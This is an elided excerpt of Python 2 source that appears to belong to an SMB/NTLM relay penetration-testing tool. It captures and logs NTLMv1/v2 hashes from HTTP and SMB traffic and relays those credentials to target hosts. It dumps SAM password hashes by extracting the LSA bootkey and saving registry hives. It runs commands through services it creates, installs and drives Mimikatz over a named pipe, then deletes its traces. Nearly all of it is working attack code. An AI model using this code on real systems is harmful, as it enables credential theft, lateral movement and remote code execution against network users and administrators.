...
SaveSam_Path = os.path.abspath(os.path.join(
    os.path.dirname(__file__))) + "/relay-dumps/"
...
def ParseHTTPHash(data, key, client, UserToRelay, Host, Pivoting):
    ...
    if NthashLen == 24:
        ...
        HostName = data[HostNameOffset:HostNameOffset +
                        HostNameLen].replace('\x00', '')
        WriteHash = '%s::%s:%s:%s:%s' % (
            User, HostName, LMHash, NTHash, key.encode("hex"))
        WriteData(
            Logs_Path +
            "logs/SMB-Relay-" +
            client +
        ...
        if client == Host:
            ...
            if Pivoting[0] == "1":
                ...
                print "[+] Received NTLMv1 hash from: %s %s" % (
                    client, ShowSmallResults((client, 445)))
        ...
        if ('!' + User) in UserToRelay:
            ...
            if Pivoting[0] == "1":
                return User, Domain
            print "[+] Username: %s is whitelisted, forwarding credentials." % (
                User)
            if ReadData(
                ...
                Host,
                    cmd=None):
                # Domain\User has already auth on this target, but it failed.
                # Ditch the connection to prevent account lockouts.
                return None, None
            else:
                return User, HostName
        else:
            print "[+] Username: %s not in target list, dropping connection." % (
                User)
            return None, None
    ...
    if NthashLen > 24:
        ...
        Domain = data[DomainOffset:DomainOffset +
                      DomainLen].replace('\x00', '')
        HostNameLen = struct.unpack('<H', data[44:46])[0]
        HostNameOffset = struct.unpack('<H', data[48:50])[0]
        HostName = data[HostNameOffset:HostNameOffset +
                        HostNameLen].replace('\x00', '')
        WriteHash = '%s::%s:%s:%s:%s' % (
            User, Domain, key.encode("hex"), NTHash[:32], NTHash[32:])
        WriteData(
            Logs_Path +
            "logs/SMB-Relay-" +
            client +
        ...
        if client == Host:
            ...
            if Pivoting[0] == "1":
                ...
                print "[+] Received NTLMv2 hash from: %s %s" % (
                    client, ShowSmallResults((client, 445)))
...
def ParseSMBHash(data, client, challenge, UserToRelay, Host, Pivoting):  # Parse SMB NTLMSSP v1/v2
    ...
    LMHash = SSPIString[LMhashOffset:LMhashOffset +
                        LMhashLen].encode("hex").upper()
    NthashLen = struct.unpack('<H', data[SSPIStart + 20:SSPIStart + 22])[0]
    NthashOffset = struct.unpack('<H', data[SSPIStart + 24:SSPIStart + 26])[0]

    if NthashLen == 24:
        SMBHash = SSPIString[NthashOffset:NthashOffset +
                             NthashLen].encode("hex").upper()
        DomainLen = struct.unpack('<H', SSPIString[30:32])[0]
        DomainOffset = struct.unpack('<H', SSPIString[32:34])[0]
        Domain = SSPIString[DomainOffset:DomainOffset +
                            DomainLen].decode('UTF-16LE')
        UserLen = struct.unpack('<H', SSPIString[38:40])[0]
        UserOffset = struct.unpack('<H', SSPIString[40:42])[0]
        Username = SSPIString[UserOffset:UserOffset +
                              UserLen].decode('UTF-16LE')
        WriteHash = '%s::%s:%s:%s:%s' % (
            Username, Domain, LMHash, SMBHash, challenge.encode("hex"))
        WriteData(
            Logs_Path +
            "logs/SMB-Relay-SMB-" +
            client +
    ...
    if NthashLen > 60:
        ...
        Username = SSPIString[UserOffset:UserOffset +
                              UserLen].decode('UTF-16LE')
        WriteHash = '%s::%s:%s:%s:%s' % (
            Username, Domain, challenge.encode("hex"), SMBHash[:32], SMBHash[32:])
        WriteData(
            Logs_Path +
            "logs/SMB-Relay-SMB-" +
            client +
...
def Parse_Nego_Dialect(data):
    Dialect = tuple([e.replace('\x00', '')
                     for e in data[40:].split('\x02')[:10]])
    for i in range(0, 16):
...
def ExtractSMBChallenge(data, Pivoting):
    ...
    if Pivoting[0] == "1":
        ...
        print "[+] Setting up SMB relay with SMB challenge:", Challenge.encode(
            "hex")
        return Challenge
...
def ExtractHTTPChallenge(data, Pivoting):
    ...
    if Pivoting[0] == "1":
        ...
        print "[+] Setting up HTTP relay with SMB challenge:", Challenge.encode(
            "hex")
        return Challenge

# Here we extract the complete NTLM message from an HTTP request and we
# will later feed it to our SMB target.
...
# Used for SMB read operations. We grab everything past the Byte Count len
# in the packet.
...
# Used for SMB/DCE-RPC read operations. We grab everything past the Byte
# Count len in the packet.
...
def GenerateServiceName():
    return ''.join([random.choice(
        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(11)])
...
def GrabNegotiateFromTarget(data, s, Pivoting):
    ...
    if smbdata[8:10] == "\x72\x00":
        head = SMBHeader(
            ...
            flag2="\x07\xc8",
            mid="\x02\x00")
        # simply grab the whole packet except the smb header from the client.
        t = data[36:]
        packet1 = str(head) + str(t)
        buffer1 = longueur(packet1) + packet1
        s.send(buffer1)
        smbdata = s.recv(4096)
        # Grab the challenge, in case we want to crack the hash later.
        challenge = ExtractSMBChallenge(smbdata, Pivoting)
...
# data until we reach our custom timeout. Set back the socket to blocking
# and return the data.
...
def WriteOutput(DataOffset, Chunk, data, f, s):
    ...
    s.send(buffer1)
    data = s.recv(2048)
    # LockingAndX //should not happens since we didn't request an oplock, but
    # just in case..
    if data[8:10] == "\x24\x00":
        head = SMBHeader(cmd="\x24",
                         flag1="\x88",
                         flag2="\x07\xc8",
                         uid=data[32:34],
                         tid=data[28:30],
...
# Tree Connect IPC$ and start to send SMB echos so we don't loose this
# precious connection.
...
def MimiKatzRPC(Command, f, host, data, s):
    ...
    if data[8:10] == "\x2f\x00":
        head = SMBHeader(cmd="\x2e",
                         ...
                         tid=data[28:30])
        t = SMBReadData(
            FID=f, MaxCountLow=struct.pack(
                '<h', 1024), MinCount=struct.pack(
                '<h', 1024), Offset="\x00\x00\x00\x00")
        t.calculate()
        packet0 = str(head) + str(t)
        buffer1 = longueur(packet0) + packet0
        s.send(buffer1)
    ...
    if data[8:10] == "\x2e\x00":
        # First Packet from output contains the complete len of what's coming,
        # don't print it.
        ...
        while True:
            ...
            if data[64:66] == "\x05\x00" and data[67] == "\x02":  # Last DCE/RPC Frag
                ...
                if LastFragLen < 1024:
                    ...
                    data, s, out = SMBDCERPCReadOutput(
                        struct.pack(
                            "<i", dataoffset), struct.pack(
                            '<h', 4096), f, data, s)
                    Output += ExtractRPCCommandOutput(data)
                    break
...
def CreateMimikatzService(
    ...
    if data[8:10] == "\x2e\x00":
        ...
        w = SMBDCESVCCTLOpenManagerW(
            MachineNameRefID="\x00\x00\x02\x00",
            MachineName=host)
        w.calculate()
...
def StopAndDeleteService(
    ...
    if data[8:10] == "\x25\x00":
        ...
        head = SMBHeader(cmd="\x25",
                         ...
                         tid=data[28:30])
        w = SMBDCESVCCTLOpenService(
            ContextHandle=ContextHandlerService,
            ServiceName=ServiceNameChars)
        w.calculate()
        x = SMBDCEPacketData(Opnum="\x10\x00", Data=w)
        x.calculate()
...
def SMBOpenFile(Filename, Share, Host, Access, data, s):
    ...
    if data[8:10] == "\x2d\x22":
        ...
        # Don't throw an exception at the calling function because there's not
        # enough value to unpack.
        f = "A"
    ...
    if data[8:10] == "\x2d\x34":  # not found
        # maybe still processing the cmd. Be patient, then grab it again.
        time.sleep(2)
        head = SMBHeader(cmd="\x2d",
                         flag1="\x10",
                         flag2="\x00\x10",
...
def SMBOpenFileForWriting(
    ...
    if data[8:10] == "\x75\x00":
        ...
        t = SMBNTCreateData(
            ...
            CreateFlags="\x00\x00\x00\x00",
            AccessMask="\x96\x01\x03\x00",
            FileAttrib="\x20\x00\x00\x00",
            ShareAccess="\x00\x00\x00\x00",
            Disposition="\x02\x00\x00\x00",
            CreateOptions="\x44\x00\x00\x00")
        t.calculate()
        packet1 = str(head) + str(t)
        buffer1 = longueur(packet1) + packet1
        s.send(buffer1)
...
def GrabAndRead(f, Filename, data, s):
    ...
    if data[8:10] == "\x2d\x00":
        ...
        # Do large reads..
        if data[8:10] == "\x2e\x00" and struct.unpack("<H", data[61:63])[
                0] == 65520:
            print 'File size: %s' % (GetReadableSize(filesize))
            ...
            for i in xrange(count_number):
                ...
                data, s, out = ReadOutput(
                    struct.pack("<i", dataoffset), f, data, s)
                Output += out
            sys.stdout.write('\n')
            sys.stdout.flush()
...
def UploadAndWrite(f, FileSize, FileContent, data, s):
    ...
    if data[8:10] == "\xa2\x00" and FileSize >= 30000:
        ...
        # Do progress bar for large uploads, so the pentester doesn't fall
        # asleep while doing a large SMB write operations..
        dataoffset = 0
        count = 0
        bar = 80
        start_time = time.time()
...
def DeleteAFile(Filename, data, s, Host):
    ...
    if data[8:10] == "\x06\x21":
        print "[+] Delete Failed. Server (" + Host + ") returned STATUS_CANNOT_DELETE, " + \
            Filename + " is currently in use by another process."
...
def DumpHashes(data, s, Host):
    ...
    try:
        stopped = False
        data, s, f = BindCall(
            "\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03", "\x01\x00", "\\winreg", data, s)
        ...
        if f == "ServiceNotFound":
            stopped = True
            data, s, f = BindCall(
                "\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
        ...
        # Grab the keys
        if data[8:10] == "\x25\x00":
            JD, data = GrabKeyValue(
                s, f, handler, data, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD")
            Skew1, data = GrabKeyValue(
                s, f, handler, data, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1")
            Data, data = GrabKeyValue(
                s, f, handler, data, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data")
            GBG, data = GrabKeyValue(
                s, f, handler, data, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG")

        # Dump bootkey, then finish up.
        BootKey = ConvertValuesToBootKey(
            str(JD + Skew1 + GBG + Data).decode("hex"))
        RandomFile = ''.join([random.choice(
            'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(6)]) + '.tmp'
        data, s, f = SaveKeyToFile(
            "C:\\Windows\\Temp\\" + RandomFile, "SAM", handler, f, data, s)
        data, s = CloseFID(f, data, s)
        data, s, f = SMBOpenFile(
            "\\Windows\\Temp\\" + RandomFile, "C", Host, RW, data, s)
        data, s, Output = ReadAndDelete(
            f, "\\Windows\\Temp\\" + RandomFile, data, s)
        ...
        # After everything has been cleaned up, we write to file and call
        # creddump
        WriteOutputToFile(Output, "./Sam-" + Host + ".tmp")
        try:
            Hashes = dump_file_hashes(
                BootKey, SaveSam_Path + "./Sam-" + Host + ".tmp")
            WriteOutputToFile(Hashes, "./Hash-Dump-" + Host + ".txt")
        except BaseException:
            print "[+] Live dump failed, is python-crypto installed? "
            pass
        print "[+] The SAM file was saved in: ./relay-dumps/Sam-" + Host + \
            ".tmp and the hashes in ./relay-dumps/Hash-Dumped-" + Host + ".txt"
        return data

    except BaseException:
        # Don't loose this connection because something went wrong, it's a good
        # one. Hashdump might fail, while command works.
...
def SaveAKey(data, s, Host, Key):
    ...
    try:
        ...
        data, s, f = SaveKeyToFile(
            "C:\\Windows\\Temp\\" + Key + ".tmp", Key, handler, f, data, s)
        if data[8:10] != "\x25\x00":
            print "[+] Something went wrong, try something else."
            return ModifySMBRetCode(data)
        data, s = CloseFID(f, data, s)
        data, s, f = SMBOpenFile(
            "\\Windows\\Temp\\" + Key + ".tmp", "C", Host, RW, data, s)
        data, s, Output = ReadAndDelete(
            f, "\\Windows\\Temp\\" + Key + ".tmp", data, s)
        ...
        print "[+] The " + Key + " key and its subkeys were saved in: ./relay-dumps/" + \
            Host + "-" + Key + ".tmp"
        return data
...
def ReadFile(data, s, File, Host):
    try:
        ...
        # Don't ditch the connection because something went wrong.
        return ModifySMBRetCode(data)
...
def WriteFile(data, s, File, FileSize, FileContent, Host):
    try:
        File = File.replace("/", "\\")
        data, s, f = SMBOpenFileForWriting(
            File, FileSize, FileContent, "C", Host, RW, data, s)
...
def RunCmd(
    ...
    try:
        ...
        data, s, f = BindCall(
            "\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
        data, s, f = CreateService(
            Command, ServiceNameChars, ServiceIDChars, f, Host, data, s)
        data, s = CloseFID(f, data, s)
        time.sleep(1)
        ...
        # Don't loose this connection because something went wrong, it's a good
        # one. Commands might fail, while hashdump works.
        print "[+] Something went wrong, try something else."
        return ModifySMBRetCode(data)
...
def InstallMimiKatz(
    ...
    try:
        ...
        Command = "c:\\Windows\\Temp\\" + FileName + " \"rpc::server /protseq:ncacn_np /endpoint:\pipe\\" + \
            NamedPipe + " /guid:{" + DisplayGUID + "} /noreg\" service::me exit"
        ...
        data, s, f = BindCall(
            "\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
        data, s, f = CreateMimikatzService(
            Command, MimiKatzSVCName, MimiKatzSVCID, f, Host, data, s)
        data, s = CloseFID(f, data, s)
...
def RunMimiCmd(
        ...
        FileName):
    try:
        data, guid, namedpipe = InstallMimiKatz(
            data, s, clientIP, Username, Domain, Command, Logs, Host, FileName)
        data, s = SMBOpenPipe(Host, data, s)
        ...
        #####
        # Kill the SVC now... Never know when the user will leave, so lets not
        # leave anything on the target.
        data, s = SMBOpenPipe(Host, data, s)
        data, s, f = BindCall(
            "\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
        data, s, f = StopAndDeleteService(
            Command, MimiKatzSVCName, MimiKatzSVCID, f, Host, data, s)
        data, s = CloseFID(f, data, s)
        # Short sleep, to make sure the service had the time needed to stop
        # before deleting mimikatz
        time.sleep(0.5)
        data = DeleteFile(data, s, "\\Windows\\Temp\\" + FileName, Host)
